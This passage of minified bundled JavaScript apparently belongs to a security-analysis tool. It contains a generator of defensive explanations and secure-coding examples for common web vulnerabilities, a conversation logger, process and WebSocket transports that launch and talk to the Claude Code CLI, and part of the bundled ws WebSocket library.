`;for(let Q of X.lineLevelExplanations)J+=this.formatLineLevelMarkdown(Q)+`
`;J+=`## Concept-Level Analysis

`;for(let Q of X.conceptLevelExplanations)J+=this.formatConceptLevelMarkdown(Q)+`
`;return J+=`## Business Impact Analysis

`,J+=this.formatBusinessLevelMarkdown(X.businessLevelExplanation),J}generateLineLevelContent(X,J){return{sql_injection:"This line contains a SQL injection vulnerability because it uses string concatenation to build a database query. User input is directly embedded into the SQL statement without proper sanitization, allowing attackers to manipulate the query logic.",xss:"This line contains a cross-site scripting (XSS) vulnerability because it directly assigns user-controlled content to innerHTML without sanitization. This allows attackers to inject malicious scripts that execute in other users' browsers.",broken_access_control:"This endpoint lacks proper access control checks, allowing unauthorized users to access restricted functionality or data.",sensitive_data_exposure:"This line exposes sensitive data in plain text, making it vulnerable to unauthorized access or accidental disclosure."}[X.type]||`This line contains a ${X.type} vulnerability that poses security risks.`}generateSecureExample(X,J){return{sql_injection:`const query = "SELECT * FROM users WHERE id = ?";
db.query(query, [userId], callback);`,xss:`element.textContent = userInput;
// or use a sanitization library:
element.innerHTML = DOMPurify.sanitize(userInput);`,broken_access_control:`app.get("/admin/users", authenticateUser, authorizeAdmin, (req, res) => {
  // handler code
});`,sensitive_data_exposure:`const hashedPassword = await bcrypt.hash(password, 10);
// Never log sensitive data`}[X]||"Use secure coding practices for this vulnerability type."}generateConceptLevelContent(X){return{sql_injection:"SQL injection is a code injection technique that exploits vulnerabilities in an application's database layer. Attackers insert malicious SQL code into application queries, potentially gaining unauthorized access to sensitive data, modifying database contents, or executing administrative operations.",xss:"Cross-Site Scripting (XSS) allows attackers to inject client-side scripts into web pages viewed by other users. When successful, XSS attacks can access sensitive page content, session tokens, or other sensitive information, and can perform actions on behalf of the victim.",broken_access_control:"Broken access control occurs when applications fail to properly restrict what authenticated users are allowed to do. This can lead to unauthorized information disclosure, modification, or destruction of data, or performing business functions outside the user's limits."}[X]||`${X} represents a security vulnerability that requires attention.`}getPreventionMethods(X){return{sql_injection:["Use parameterized queries or prepared statements","Implement input validation and sanitization","Apply principle of least privilege for database accounts"],xss:["Output encoding and escaping","Input validation and sanitization","Content Security Policy (CSP) implementation"],broken_access_control:["Implement proper authentication mechanisms","Use role-based access control (RBAC)","Apply principle of least privilege"]}[X]||["Implement secure coding practices"]}getAttackScenarios(X){return{sql_injection:["Data extraction through UNION-based attacks","Authentication bypass via boolean-based attacks"],xss:["Script injection to steal session cookies","Phishing attacks through content manipulation"],broken_access_control:["Privilege escalation to admin functions","Horizontal privilege escalation to other users' data"]}[X]||["Various attack vectors possible"]}getRelatedConcepts(X){return{sql_injection:["Input validation","Database security","Query parameterization"],xss:["Content Security Policy","Input sanitization","Output encoding"],broken_access_control:["Authentication","Authorization","Session management"]}[X]||["Security fundamentals"]}calculateRiskScore(X){let J=0;for(let Q of X)switch(Q.severity){case"critical":J+=25;break;case"high":J+=20;break;case"medium":J+=15;break;case"low":J+=10;break}return Math.min(100,J)}analyzeBusinessImpact(X){let J=X.some((Q)=>Q.severity==="critical"||Q.severity==="high");return{dataLoss:J?"High risk of sensitive data exposure or theft":"Moderate risk of data exposure",reputationalDamage:J?"Severe impact on customer trust and brand reputation":"Potential minor impact on reputation",financialImpact:J?"Significant costs from breaches, compliance fines, and recovery":"Minimal direct financial impact",operationalDisruption:J?"Potential system compromise affecting business operations":"Limited operational impact"}}analyzeComplianceImpact(X){let J=[];if(X.some((Q)=>Q.type==="sql_injection"||Q.type==="xss"))J.push("OWASP Top 10 compliance violation");if(X.some((Q)=>Q.type==="sensitive_data_exposure"))J.push("GDPR/CCPA data protection requirements at risk");return J.length>0?J:["Monitor compliance requirements"]}determinePriorities(X){let J=[];if(X.some((Q)=>Q.severity==="critical"))J.push("Immediate action required for critical vulnerabilities");if(X.some((Q)=>Q.severity==="high"))J.push("High priority fixes should be completed within 24-48 hours");return J.push("Implement comprehensive security testing"),J}estimateTimeline(X){let J=X.filter((Y)=>Y.severity==="critical").length,Q=X.filter((Y)=>Y.severity==="high").length;if(J>0)return"Immediate (within 24 hours)";if(Q>0)return"Urgent (within 48 hours)";return"Standard (within 1 week)"}generateBusinessLevelContent(X){let J=this.calculateRiskScore(X),Q=this.groupBySeverity(X);return`Your application has ${X.length} security vulnerabilities with a risk score of ${J}/100. 
    This includes ${Q.critical} critical, ${Q.high} high, ${Q.medium} medium, 
    and ${Q.low} low severity issues. These vulnerabilities pose significant risks to your business 
    operations, customer data, and regulatory compliance.`}extractCodeSnippet(X,J){for(let Q of Object.values(J)){let Y=Q.split(`
`);if(X.line<=Y.length)return Y[X.line-1]||"Code snippet not available"}return"Code snippet not available"}generateSummary(X){let J=this.groupBySeverity(X),Q=this.identifyPrimaryRisks(X),Y=this.estimateFixTime(X);return{totalVulnerabilities:X.length,severityBreakdown:J,primaryRisks:Q,estimatedFixTime:Y}}groupBySeverity(X){let J={critical:0,high:0,medium:0,low:0};for(let Q of X)J[Q.severity]++;return J}identifyPrimaryRisks(X){return[...new Set(X.map((Q)=>this.getVulnerabilityDisplayName(Q.type)))].slice(0,3)}estimateFixTime(X){let J=X.length*2;if(J<8)return`${J} hours`;return`${Math.ceil(J/8)} days`}getVulnerabilityDisplayName(X){return{sql_injection:"SQL Injection",xss:"Cross-Site Scripting (XSS)",broken_access_control:"Broken Access Control",sensitive_data_exposure:"Sensitive Data Exposure",xml_external_entities:"XML External Entities (XXE)",security_misconfiguration:"Security Misconfiguration",vulnerable_components:"Vulnerable Components",broken_authentication:"Broken Authentication",insecure_deserialization:"Insecure Deserialization",insufficient_logging:"Insufficient Logging"}[X]||X}formatLineLevelMarkdown(X){return`### ${X.title}

**Risk Level:** ${X.riskLevel}

${X.content}

**Vulnerable Code:**
\`\`\`javascript
${X.codeSnippet}
\`\`\`

**Secure Example:**
\`\`\`javascript
${X.secureExample}
\`\`\`

`}formatConceptLevelMarkdown(X){let J=`### ${X.title}

${X.content}

**Prevention Methods:**
`;for(let Q of X.preventionMethods)J+=`- ${Q}
`;J+=`
**Common Attack Scenarios:**
`;for(let Q of X.attackScenarios)J+=`- ${Q}
`;return J+`
`}formatBusinessLevelMarkdown(X){return`### ${X.title}

**Risk Score:** ${X.riskScore}/100

${X.content}

**Business Impact:**
- **Data Loss Risk:** ${X.businessImpact.dataLoss}
- **Reputational Damage:** ${X.businessImpact.reputationalDamage}  
- **Financial Impact:** ${X.businessImpact.financialImpact}
- **Operational Disruption:** ${X.businessImpact.operationalDisruption}

**Timeline:** ${X.timeline}

`}}var $D=s(()=>{TX()});import*as j6 from"fs/promises";import*as wQ from"path";var c6;var VD=s(()=>{I1();c6=class c6{static logger=new B5;static instance=null;logDir;enabled;logLevel;constructor(){this.logLevel=process.env.AI_CONVERSATION_LOG_LEVEL||"none",this.enabled=this.logLevel!=="none",this.logDir=process.env.AI_CONVERSATION_LOG_DIR||"./ai-conversation-logs"}static getInstance(){if(!this.instance)this.instance=new c6;return this.instance}async initialize(){if(!this.enabled)return;try{await j6.mkdir(this.logDir,{recursive:!0}),c6.logger.info(`Conversation logging initialized (level: ${this.logLevel}, dir: ${this.logDir})`)}catch(X){c6.logger.error(`Failed to create log directory: ${X}`),this.enabled=!1}}async logConversation(X){if(!this.enabled)return;try{let Q=`${new Date().toISOString().replace(/[:.]/g,"-")}_${X.issueId}_${X.provider}.json`,Y=wQ.join(this.logDir,Q),W;if(this.logLevel==="full")W=X;else if(this.logLevel==="summary")W={...X,messages:X.messages.map((H)=>({role:H.role,contentLength:H.content?.length||0,toolUse:H.tool_use?.map((z)=>z.name)||[],timestamp:H.timestamp}))};await j6.writeFile(Y,JSON.stringify(W,null,2)),c6.logger.debug(`Logged conversation to ${Q}`);let G=wQ.join(this.logDir,"latest.json");try{await j6.unlink(G).catch(()=>{}),await j6.symlink(Q,G)}catch{}}catch(J){c6.logger.error(`Failed to log conversation: ${J}`)}}async logSummary(X,J){if(!this.enabled)return;try{let Q=wQ.join(this.logDir,"summary.log"),W=`${new Date().toISOString()} [${X}] ${J}
`;await j6.appendFile(Q,W)}catch(Q){c6.logger.error(`Failed to log summary: ${Q}`)}}getLogDirectory(){return this.logDir}isEnabled(){return this.enabled}}});var hG={};N0(hG,{query:()=>tx1,Query:()=>xG,AbortError:()=>l6});import{createRequire as Tx1}from"node:module";import{join as UD}from"path";import{fileURLToPath as gx1}from"url";import{setMaxListeners as mx1}from"events";import{spawn as cx1}from"child_process";import{join as ZD}from"path";import{fileURLToPath as lx1}from"url";import{createInterface as px1}from"readline";import*as E1 from"fs";import{stat as dx1}from"fs/promises";function fG(X=ux1){let J=new AbortController;return mx1(X,J.signal),J}function ax1(){return rx1}class OD{options;child;childStdin;childStdout;ready=!1;abortController;exitError;exitListeners=[];processExitHandler;abortHandler;isStreaming;constructor(X){this.options=X,this.abortController=X.abortController||fG(),this.isStreaming=typeof X.prompt!=="string",this.initialize()}initialize(){try{let{prompt:X,additionalDirectories:J=[],cwd:Q,executable:Y=this.isRunningWithBun()?"bun":"node",executableArgs:W=[],extraArgs:G={},pathToClaudeCodeExecutable:H,env:z={...process.env},stderr:$,customSystemPrompt:V,appendSystemPrompt:K,maxTurns:Z,model:q,fallbackModel:B,permissionMode:M,permissionPromptToolName:O,continueConversation:R,resume:I,allowedTools:F=[],disallowedTools:T=[],mcpServers:b,strictMcpConfig:h,canUseTool:L}=this.options,N=["--output-format","stream-json","--verbose"];if(V)N.push("--system-prompt",V);if(K)N.push("--append-system-prompt",K);if(Z)N.push("--max-turns",Z.toString());if(q)N.push("--model",q);if(z.DEBUG)N.push("--debug-to-stderr");if(L){if(typeof X==="string")throw Error("canUseTool callback requires --input-format stream-json. Please set prompt as an AsyncIterable.");if(O)throw Error("canUseTool callback cannot be used with permissionPromptToolName. Please use one or the other.");N.push("--permission-prompt-tool","stdio")}else if(O)N.push("--permission-prompt-tool",O);if(R)N.push("--continue");if(I)N.push("--resume",I);if(F.length>0)N.push("--allowedTools",F.join(","));if(T.length>0)N.push("--disallowedTools",T.join(","));if(b&&Object.keys(b).length>0)N.push("--mcp-config",JSON.stringify({mcpServers:b}));if(h)N.push("--strict-mcp-config");if(M&&M!=="default")N.push("--permission-mode",M);if(B){if(q&&B===q)throw Error("Fallback model cannot be the same as the main model. Please specify a different model for fallbackModel option.");N.push("--fallback-model",B)}if(typeof X==="string")N.push("--print"),N.push("--",X.trim());else N.push("--input-format","stream-json");for(let J1 of J)N.push("--add-dir",J1);for(let[J1,q1]of Object.entries(G))if(q1===null)N.push(`--${J1}`);else N.push(`--${J1}`,q1);if(!z.CLAUDE_CODE_ENTRYPOINT)z.CLAUDE_CODE_ENTRYPOINT="sdk-ts";let k=H||this.getDefaultExecutablePath();if(!ax1().existsSync(k))throw Error(`Claude Code executable not found at ${k}. Is options.pathToClaudeCodeExecutable set?`);this.logDebug(`Spawning Claude Code process: ${Y} ${[...W,k,...N].join(" ")}`);let c=z.DEBUG||$?"pipe":"ignore";if(this.child=cx1(Y,[...W,k,...N],{cwd:Q,stdio:["pipe","pipe",c],signal:this.abortController.signal,env:z}),this.childStdin=this.child.stdin,this.childStdout=this.child.stdout,typeof X==="string")this.childStdin.end(),this.childStdin=void 0;if(z.DEBUG||$)this.child.stderr.on("data",(J1)=>{if(this.logDebug(`Claude Code stderr: ${J1.toString()}`),$)$(J1.toString())});let a=()=>{if(this.child&&!this.child.killed)this.child.kill("SIGTERM")};this.processExitHandler=a,this.abortHandler=a,process.on("exit",this.processExitHandler),this.abortController.signal.addEventListener("abort",this.abortHandler),this.child.on("error",(J1)=>{if(this.ready=!1,this.abortController.signal.aborted)this.exitError=new l6("Claude Code process aborted by user");else this.exitError=Error(`Failed to spawn Claude Code process: ${J1.message}`),this.logDebug(this.exitError.message)}),this.child.on("close",(J1,q1)=>{if(this.ready=!1,this.abortController.signal.aborted)this.exitError=new l6("Claude Code process aborted by user");else{let _1=this.getProcessExitError(J1,q1);if(_1)this.exitError=_1,this.logDebug(_1.message)}}),this.ready=!0}catch(X){throw this.ready=!1,X}}getProcessExitError(X,J){if(X!==0&&X!==null)return Error(`Claude Code process exited with code ${X}`);else if(J)return Error(`Claude Code process terminated by signal ${J}`);return}getDefaultExecutablePath(){let X=lx1(import.meta.url),J=ZD(X,"..","..");return ZD(J,"entrypoints","cli.js")}isRunningWithBun(){return process.versions.bun!==void 0||process.env.BUN_INSTALL!==void 0}logDebug(X){if(process.env.DEBUG)process.stderr.write(`${X}
`)}write(X){if(this.abortController.signal.aborted)throw new l6("Operation aborted");if(!this.ready||!this.childStdin)throw Error("ProcessTransport is not ready for writing");if(this.child?.killed||this.child?.exitCode!==null)throw Error("Cannot write to terminated process");if(this.exitError)throw Error(`Cannot write to process that exited with error: ${this.exitError.message}`);if(process.env.DEBUG_SDK)process.stderr.write(`[ProcessTransport] Writing to stdin: ${X.substring(0,100)}
`);try{if(!this.childStdin.write(X)&&process.env.DEBUG_SDK)console.warn("[ProcessTransport] Write buffer full, data queued")}catch(J){throw this.ready=!1,Error(`Failed to write to process stdin: ${J.message}`)}}close(){if(this.childStdin)this.childStdin.end(),this.childStdin=void 0;if(this.processExitHandler)process.off("exit",this.processExitHandler),this.processExitHandler=void 0;if(this.abortHandler)this.abortController.signal.removeEventListener("abort",this.abortHandler),this.abortHandler=void 0;for(let{handler:X}of this.exitListeners)this.child?.off("exit",X);if(this.exitListeners=[],this.child&&!this.child.killed)this.child.kill("SIGTERM"),setTimeout(()=>{if(this.child&&!this.child.killed)this.child.kill("SIGKILL")},5000);this.ready=!1}isReady(){return this.ready}async*readMessages(){if(!this.childStdout)throw Error("ProcessTransport output stream not available");let X=px1({input:this.childStdout});try{for await(let J of X)if(J.trim())yield JSON.parse(J);await this.waitForExit()}catch(J){throw J}finally{X.close()}}endInput(){if(this.childStdin)this.childStdin.end()}getInputStream(){return this.childStdin}onExit(X){if(!this.child)return()=>{};let J=(Q,Y)=>{let W=this.getProcessExitError(Q,Y);X(W)};return this.child.on("exit",J),this.exitListeners.push({callback:X,handler:J}),()=>{if(this.child)this.child.off("exit",J);let Q=this.exitListeners.findIndex((Y)=>Y.handler===J);if(Q!==-1)this.exitListeners.splice(Q,1)}}async waitForExit(){if(!this.child){if(this.exitError)throw this.exitError;return}if(this.child.exitCode!==null||this.child.killed){if(this.exitError)throw this.exitError;return}return new Promise((X,J)=>{let Q=(W,G)=>{if(this.abortController.signal.aborted){J(new l6("Operation aborted"));return}let H=this.getProcessExitError(W,G);if(H)J(H);else X()};this.child.once("exit",Q);let Y=(W)=>{this.child.off("exit",Q),J(W)};this.child.once("error",Y),this.child.once("exit",()=>{this.child.off("error",Y)})})}}function bG(X){if(process.env.DEBUG||process.env.DEBUG_SDK)console.log(X)}function qD(X){if(process.env.DEBUG||process.env.DEBUG_SDK)console.error(X)}class FD{options;ws;ready=!1;abortController;messageQueue=[];messageResolve;messageReject;closed=!1;exitError;readyPromise;readyResolve;readyReject;abortHandler;constructor(X){this.options=X,this.abortController=X.abortController||fG(),this.readyPromise=new Promise((J,Q)=>{this.readyResolve=J,this.readyReject=Q}),this.initialize()}initialize(){try{let{url:X,headers:J}=this.options,Q=new URL(X);if(!Q.protocol.startsWith("ws"))throw Error("WebSocket URL must use ws:// or wss:// protocol");let Y={headers:J,handshakeTimeout:kG};this.ws=new NQ(Q.toString(),Y);let W=setTimeout(()=>{if(!this.ready){this.ws?.close();let G=Error(`WebSocket connection timeout after ${kG}ms`);if(this.exitError=G,this.readyReject)this.readyReject(G)}},kG);if(this.ws.on("open",()=>{if(clearTimeout(W),this.ready=!0,this.readyResolve)this.readyResolve();bG(`WebSocket connected to ${X}`)}),this.ws.on("error",(G)=>{if(clearTimeout(W),this.ready=!1,this.exitError=G,this.readyReject)this.readyReject(G);if(qD(`WebSocket error: ${G.message}`),this.messageReject)this.messageReject(G),this.messageReject=void 0,this.messageResolve=void 0}),this.ws.on("close",(G,H)=>{this.ready=!1,this.closed=!0;let z=H.toString();if(G!==sx1&&G!==ox1)this.exitError=Error(`WebSocket closed abnormally with code ${G}: ${z}`);if(bG(`WebSocket closed: ${G} ${z}`),this.messageResolve)this.messageResolve({done:!0,value:void 0}),this.messageResolve=void 0,this.messageReject=void 0}),this.ws.on("message",(G)=>{let z=G.toString().split(`
`);for(let $ of z)if($.trim())try{let V=JSON.parse($);this.enqueueMessage(V)}catch(V){qD(`Failed to parse WebSocket message: ${$}`)}}),this.abortController)if(this.abortHandler=()=>{this.close(),this.exitError=new l6("WebSocket connection aborted by user")},this.abortController.signal.aborted)this.abortHandler();else this.abortController.signal.addEventListener("abort",this.abortHandler)}catch(X){if(this.ready=!1,this.exitError=X,this.readyReject)this.readyReject(X);throw X}}enqueueMessage(X){if(this.messageResolve)this.messageResolve({done:!1,value:X}),this.messageResolve=void 0,this.messageReject=void 0;else this.messageQueue.push(X)}async write(X){if(this.abortController.signal.aborted)throw new l6("Operation aborted");if(!this.ready)await this.readyPromise;if(!this.ready||!this.ws||this.ws.readyState!==NQ.OPEN)throw Error("WebSocketTransport is not ready for writing");bG(`[WebSocketTransport] Writing: ${X.substring(0,100)}`),this.ws.send(X)}close(){if(this.abortHandler&&this.abortController)this.abortController.signal.removeEventListener("abort",this.abortHandler),this.abortHandler=void 0;if(this.ws&&this.ws.readyState===NQ.OPEN)this.ws.close(1000,"Normal closure");this.ready=!1,this.closed=!0}isReady(){return this.ready&&this.ws?.readyState===NQ.OPEN}endInput(){}async*readMessages(){while(!this.closed||this.messageQueue.length>0){if(this.messageQueue.length>0){yield this.messageQueue.shift();continue}if(this.closed)break;let X=await new Promise((J,Q)=>{if(this.messageQueue.length>0){let Y=this.messageQueue.shift();J({done:!1,value:Y});return}if(this.closed){J({done:!0,value:void 0});return}this.messageResolve=J,this.messageReject=Q});if(X.done)break;yield X.value}if(this.exitError)throw this.exitError}}function tx1({prompt:X,options:{abortController:J=fG(),additionalDirectories:Q=[],allowedTools:Y=[],appendSystemPrompt:W,canUseTool:G,continue:H,customSystemPrompt:z,cwd:$,disallowedTools:V=[],env:K,executable:Z=ex1()?"bun":"node",executableArgs:q=[],extraArgs:B={},fallbackModel:M,hooks:O,maxTurns:R,mcpServers:I,model:F,pathToClaudeCodeExecutable:T,permissionMode:b="default",permissionPromptToolName:h,resume:L,stderr:N,strictMcpConfig:k,websocket:_}={}}){if(!K)K={...process.env};if(!K.CLAUDE_CODE_ENTRYPOINT)K.CLAUDE_CODE_ENTRYPOINT="sdk-ts";if(T===void 0){let q1=gx1(import.meta.url),_1=UD(q1,"..");T=UD(_1,"cli.js")}let c=typeof X!=="string",a;if(_){if(typeof X==="string")throw Error("WebSocket transport requires prompt as AsyncIterable for bidirectional communication");a=new FD({url:_.url,headers:_.headers,abortController:J})}else a=new OD({prompt:X,abortController:J,additionalDirectories:Q,cwd:$,executable:Z,executableArgs:q,extraArgs:B,pathToClaudeCodeExecutable:T,env:K,stderr:N,customSystemPrompt:z,appendSystemPrompt:W,maxTurns:R,model:F,fallbackModel:M,permissionMode:b,permissionPromptToolName:h,continueConversation:H,resume:L,allowedTools:Y,disallowedTools:V,mcpServers:I,strictMcpConfig:k,canUseTool:!!G,hooks:!!O});let J1=new xG(a,c,G,O,J);if(typeof X!=="string")J1.streamInput(X);return J1}function ex1(){return process.versions.bun!==void 0||process.env.BUN_INSTALL!==void 0}var _x1,Ex1,KD,kx1,bx1,J5=(X,J,Q)=>{Q=X!=null?_x1(Ex1(X)):{};let Y=J||!X||!X.__esModule?KD(Q,"default",{value:X,enumerable:!0}):Q;for(let W of kx1(X))if(!bx1.call(Y,W))KD(Y,W,{get:()=>X[W],enumerable:!0});return Y},R9=(X,J)=>()=>(J||X((J={exports:{}}).exports,J),J.exports),v0,FX,LQ,vx1,IQ,Q5,BD,MD,fx1,jD,vG,xx1,hx1,yx1,ux1=50,ix1,rx1,l6,W60,G60,H60,nx1,z60,NQ,kG=5000,sx1=1000,ox1=1001,RD,xG;var yG=s(()=>{_x1=Object.create,Ex1=Object.getPrototypeOf,KD=Object.defineProperty,kx1=Object.getOwnPropertyNames,bx1=Object.prototype.hasOwnProperty,v0=Tx1(import.meta.url),FX=R9((X,J)=>{var Q=["nodebuffer","arraybuffer","fragments"],Y=typeof Blob<"u";if(Y)Q.push("blob");J.exports={BINARY_TYPES:Q,EMPTY_BUFFER:Buffer.alloc(0),GUID:"258EAFA5-E914-47DA-95CA-C5AB0DC85B11",hasBlob:Y,kForOnEventAttribute:Symbol("kIsForOnEventAttribute"),kListener:Symbol("kListener"),kStatusCode:Symbol("status-code"),kWebSocket:Symbol("websocket"),NOOP:()=>{}}}),LQ=R9((X,J)=>{var{EMPTY_BUFFER:Q}=FX(),Y=Buffer[Symbol.species];function W(V,K){if(V.length===0)return Q;if(V.length===1)return V[0];let Z=Buffer.allocUnsafe(K),q=0;for(let B=0;B<V.length;B++){let M=V[B];Z.set(M,q),q+=M.length}if(q<K)return new Y(Z.buffer,Z.byteOffset,q);return Z}function G(V,K,Z,q,B){for(let M=0;M<B;M++)Z[q+M]=V[M]^K[M&3]}function H(V,K){for(let Z=0;Z<V.length;Z++)V[Z]^=K[Z&3]}function z(V){if(V.length===V.buffer.byteLength)return V.buffer;return V.buffer.slice(V.byteOffset,V.byteOffset+V.length)}function $(V){if($.readOnly=!0,Buffer.isBuffer(V))return V;let K;if(V instanceof ArrayBuffer)K=new Y(V);else if(ArrayBuffer.isView(V))K=new Y(V.buffer,V.byteOffset,V.byteLength);else K=Buffer.from(V),$.readOnly=!1;return K}if(J.exports={concat:W,mask:G,toArrayBuffer:z,toBuffer:$,unmask:H},!process.env.WS_NO_BUFFER_UTIL)try{let V=(()=>{throw Error("Cannot require module bufferutil")})();J.exports.mask=function(K,Z,q,B,M){if(M<48)G(K,Z,q,B,M);else V.mask(K,Z,q,B,M)},J.exports.unmask=function(K,Z){if(K.length<32)H(K,Z);else V.unmask(K,Z)}}catch(V){}}),vx1=R9((X,J)=>{var Q=Symbol("kDone"),Y=Symbol("kRun");class W{constructor(G){this[Q]=()=>{this.pending--,this[Y]()},this.concurrency=G||1/0,this.jobs=[],this.pending=0}add(G){this.jobs.push(G),this[Y]()}[Y](){if(this.pending===this.concurrency)return;if(this.jobs.length){let G=this.jobs.shift();this.pending++,G(this[Q])}}}J.exports=W}),IQ=R9((X,J)=>{var Q=v0("zlib"),Y=LQ(),W=vx1(),{kStatusCode:G}=FX(),H=Buffer[Symbol.species],z=Buffer.from([0,0,255,255]),$=Symbol("permessage-deflate"),V=Symbol("total-length"),K=Symbol("callback"),Z=Symbol("buffers"),q=Symbol("error"),B;class M{constructor(F,T,b){if(this._maxPayload=b|0,this._options=F||{},this._threshold=this._options.threshold!==void 0?this._options.threshold:1024,this._isServer=!!T,this._deflate=null,this._inflate=null,this.params=null,!B){let h=this._options.concurrencyLimit!==void 0?this._options.concurrencyLimit:10;B=new W(h)}}static get extensionName(){return"permessage-deflate"}offer(){let F={};if(this._options.serverNoContextTakeover)F.server_no_context_takeover=!0;if(this._options.clientNoContextTakeover)F.client_no_context_takeover=!0;if(this._options.serverMaxWindowBits)F.server_max_window_bits=this._options.serverMaxWindowBits;if(this._options.clientMaxWindowBits)F.client_max_window_bits=this._options.clientMaxWindowBits;else if(this._options.clientMaxWindowBits==null)F.client_max_window_bits=!0;return F}accept(F){return F=this.normalizeParams(F),this.params=this._isServer?this.acceptAsServer(F):this.acceptAsClient(F),this.params}cleanup(){if(this._inflate)this._inflate.close(),this._inflate=null;if(this._deflate){let F=this._deflate[K];if(this._deflate.close(),this._deflate=null,F)F(Error("The deflate stream was closed while data was being processed"))}}acceptAsServer(F){let T=this._options,b=F.find((h)=>{if(T.serverNoContextTakeover===!1&&h.server_no_context_takeover||h.server_max_window_bits&&(T.serverMaxWindowBits===!1||typeof T.serverMaxWindowBits==="number"&&T.serverMaxWindowBits>h.server_max_window_bits)||typeof T.clientMaxWindowBits==="number"&&!h.client_max_window_bits)return!1;return!0});if(!b)throw Error("None of the extension offers can be accepted");if(T.serverNoContextTakeover)b.server_no_context_takeover=!0;if(T.clientNoContextTakeover)b.client_no_context_takeover=!0;if(typeof T.serverMaxWindowBits==="number")b.server_max_window_bits=T.serverMaxWindowBits;if(typeof T.clientMaxWindowBits==="number")b.client_max_window_bits=T.clientMaxWindowBits;else if(b.client_max_window_bits===!0||T.clientMaxWindowBits===!1)delete b.client_max_window_bits;return b}acceptAsClient(F){let T=F[0];if(this._options.clientNoContextTakeover===!1&&T.client_no_context_takeover)throw Error('Unexpected parameter "client_no_context_takeover"');if(!T.client_max_window_bits){if(typeof this._options.clientMaxWindowBits==="number")T.client_max_window_bits=this._options.clientMaxWindowBits}else if(this._options.clientMaxWindowBits===!1||typeof this._options.clientMaxWindowBits==="number"&&T.client_max_window_bits>this._options.clientMaxWindowBits)throw Error('Unexpected or invalid parameter "client_max_window_bits"');return T}normalizeParams(F){return F.forEach((T)=>{Object.keys(T).forEach((b)=>{let h=T[b];if(h.length>1)throw Error(`Parameter "${b}" must have only a single value`);if(h=h[0],b==="client_max_window_bits"){if(h!==!0){let L=+h;if(!Number.isInteger(L)||L<8||L>15)throw TypeError(`Invalid value for parameter "${b}": ${h}`);h=L}else if(!this._isServer)throw TypeError(`Invalid value for parameter "${b}": ${h}`)}else if(b==="server_max_window_bits"){let L=+h;if(!Number.isInteger(L)||L<8||L>15)throw TypeError(`Invalid value for parameter "${b}": ${h}`);h=L}else if(b==="client_no_context_takeover"||b==="server_no_context_takeover"){if(h!==!0)throw TypeError(`Invalid value for parameter "${b}": ${h}`)}else throw Error(`Unknown parameter "${b}"`);T[b]=h})}),F}decompress(F,T,b){B.add((h)=>{this._decompress(F,T,(L,N)=>{h(),b(L,N)})})}compress(F,T,b){B.add((h)=>{this._compress(F,T,(L,N)=>{h(),b(L,N)})})}_decompress(F,T,b){let h=this._isServer?"client":"server";if(!this._inflate){let L=`${h}_max_window_bits`,N=typeof this.params[L]!=="number"?Q.Z_DEFAULT_WINDOWBITS:this.params[L];this._inflate=Q.createInflateRaw({...this._options.zlibInflateOptions,windowBits:N}),this._inflate[$]=this,this._inflate[V]=0,this._inflate[Z]=[],this._inflate.on("error",I),this._inflate.on("data",R)}if(this._inflate[K]=b,this._inflate.write(F),T)this._inflate.write(z);this._inflate.flush(()=>{let L=this._inflate[q];if(L){this._inflate.close(),this._inflate=null,b(L);return}let N=Y.concat(this._inflate[Z],this._inflate[V]);if(this._inflate._readableState.endEmitted)this._inflate.close(),this._inflate=null;else if(this._inflate[V]=0,this._inflate[Z]=[],T&&this.params[`${h}_no_context_takeover`])this._inflate.reset();b(null,N)})}_compress(F,T,b){let h=this._isServer?"server":"client";if(!this._deflate){let L=`${h}_max_window_bits`,N=typeof this.params[L]!=="number"?Q.Z_DEFAULT_WINDOWBITS:this.params[L];this._deflate=Q.createDeflateRaw({...this._options.zlibDeflateOptions,windowBits:N}),this._deflate[V]=0,this._deflate[Z]=[],this._deflate.on("data",O)}this._deflate[K]=b,this._deflate.write(F),this._deflate.flush(Q.Z_SYNC_FLUSH,()=>{if(!this._deflate)return;let L=Y.concat(this._deflate[Z],this._deflate[V]);if(T)L=new H(L.buffer,L.byteOffset,L.length-4);if(this._deflate[K]=null,this._deflate[V]=0,this._deflate[Z]=[],T&&this.params[`${h}_no_context_takeover`])this._deflate.reset();b(null,L)})}}J.exports=M;function O(F){this[Z].push(F),this[V]+=F.length}function R(F){if(this[V]+=F.length,this[$]._maxPayload<1||this[V]<=this[$]._maxPayload){this[Z].push(F);return}this[q]=RangeError("Max payload size exceeded"),this[q].code="WS_ERR_UNSUPPORTED_MESSAGE_LENGTH",this[q][G]=1009,this.removeListener("data",R),this.reset()}function I(F){if(this[$]._inflate=null,this[q]){this[K](this[q]);return}F[G]=1007,this[K](F)}}),Q5=R9((X,J)=>{var{isUtf8:Q}=v0("buffer"),{hasBlob:Y}=FX(),W=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,1,1,1,0,0,1,1,0,1,1,0,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1,0];function G($){return $>=1000&&$<=1014&&$!==1004&&$!==1005&&$!==1006||$>=3000&&$<=4999}function H($){let V=$.length,K=0;while(K<V)if(($[K]&128)===0)K++;else if(($[K]&224)===192){if(K+1===V||($[K+1]&192)!==128||($[K]&254)===192)return!1;K+=2}else if(($[K]&240)===224){if(K+2>=V||($[K+1]&192)!==128||($[K+2]&192)!==128||$[K]===224&&($[K+1]&224)===128||$[K]===237&&($[K+1]&224)===160)return!1;K+=3}else if(($[K]&248)===240){if(K+3>=V||($[K+1]&192)!==128||($[K+2]&192)!==128||($[K+3]&192)!==128||$[K]===240&&($[K+1]&240)===128||$[K]===244&&$[K+1]>143||$[K]>244)return!1;K+=4}else return!1;return!0}function z($){return Y&&typeof $==="object"&&typeof $.arrayBuffer==="function"&&typeof $.type==="string"&&typeof $.stream==="function"&&($[Symbol.toStringTag]==="Blob"||$[Symbol.toStringTag]==="File")}if(J.exports={isBlob:z,isValidStatusCode:G,isValidUTF8:H,tokenChars:W},Q)J.exports.isValidUTF8=function($){return $.length<24?H($):Q($)};else if(!process.env.WS_NO_UTF_8_VALIDATE)try{let $=(()=>{throw Error("Cannot require module utf-8-validate")})();J.exports.isValidUTF8=function(V){return 